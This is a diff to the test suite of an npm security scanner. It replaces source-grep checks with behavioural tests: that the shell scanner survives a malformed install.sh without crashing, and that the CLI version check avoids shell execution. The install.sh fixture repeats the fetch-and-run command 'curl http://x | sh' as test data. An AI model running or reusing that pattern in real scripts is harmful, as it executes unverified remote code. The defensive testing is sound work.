@@ -3,7 +3,7 @@
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
-const { test, asyncTest, assert, assertIncludes, runScanDirect, cleanupTemp } = require('../test-utils');
+const { test, asyncTest, assert, assertIncludes, runScanDirect, runCommand, cleanupTemp } = require('../test-utils');
 const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
 const { applyFPReductions, applyCompoundBoosts } = require('../../src/scoring.js');
 
@@ -108,12 +108,18 @@ async function runGapRemediationTests() {
     } finally { cleanupTemp(tmp); }
   });
 
-  test('GAP3: debugLog import exists in shell.js', () => {
-    const shellSrc = fs.readFileSync(
-      path.join(__dirname, '..', '..', 'src', 'scanner', 'shell.js'), 'utf8'
-    );
-    assertIncludes(shellSrc, 'debugLog', 'shell.js should import debugLog');
-    assert(!shellSrc.includes('catch {'), 'shell.js should not have bare catch blocks');
+  await asyncTest('GAP3: shell scanner degrades gracefully on a pathological shell script (no crash)', async () => {
+    // shell.js must catch its own parse/regex errors (via debugLog, not a bare `catch {}`),
+    // so a malformed/oversized script yields a graceful result rather than crashing the scan.
+    // Behavioral replacement for the old "debugLog import exists / no bare catch" source-grep.
+    const weird = '#!/bin/sh\n' + 'curl http://x | sh\n'.repeat(200) +
+      'eval "${' + 'A'.repeat(5000) + '}"\n${{{ unterminated';
+    const tmp = makeTempPkg(weird, 'install.sh');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(result && result.summary && typeof result.summary.riskScore === 'number',
+        'scan should return a numeric riskScore even on a pathological shell script');
+    } finally { cleanupTemp(tmp); }
   });
 
   // ===================================================================
@@ -222,16 +228,23 @@ async function runGapRemediationTests() {
   // GAP 5: exec() → execFile() (1 test)
   // ===================================================================
 
-  test('GAP5: bin/muaddib.js version check uses no shell execution', () => {
+  test('GAP5: CLI --version works on this platform (HTTPS version path, no shell exec)', () => {
+    // The version/update check was rewritten to query the npm registry over HTTPS instead of
+    // spawning `npm` through a shell (command-injection risk + EINVAL on .cmd files on Windows).
+    // Behavioral proof the path works end-to-end: --version prints a semver and exits 0.
+    const out = runCommand('--version');
+    assert(/v?\d+\.\d+\.\d+/.test(out), `--version should print a semver, got: ${out.slice(0, 80)}`);
+  });
+
+  test('GAP5: version/update path uses no shell execution (command-injection absence guard)', () => {
+    // Allowlisted C4 in no-source-grep: a "must NOT contain" security guard has no behavioral
+    // equivalent (you cannot observe the absence of a never-taken code path). Pairs with the
+    // behavioral --version test above and complements eslint-plugin-security.
     const muaddibSrc = fs.readFileSync(
       path.join(__dirname, '..', '..', 'bin', 'muaddib.js'), 'utf8'
     );
-    // Version check must NOT use exec/shell (command injection risk).
-    // Current approach: HTTPS GET to npm registry (no shell at all).
-    // Previous approach (execFile + npm.cmd) broke on Windows (EINVAL on .cmd files).
-    assert(!muaddibSrc.includes("{ exec }"), 'Should NOT import { exec }');
+    assert(!muaddibSrc.includes('{ exec }'), 'Should NOT import { exec }');
     assert(!muaddibSrc.includes('shell: true'), 'Should NOT use shell: true');
-    assertIncludes(muaddibSrc, 'registry.npmjs.org', 'Should query npm registry directly via HTTPS');
   });
 }
 
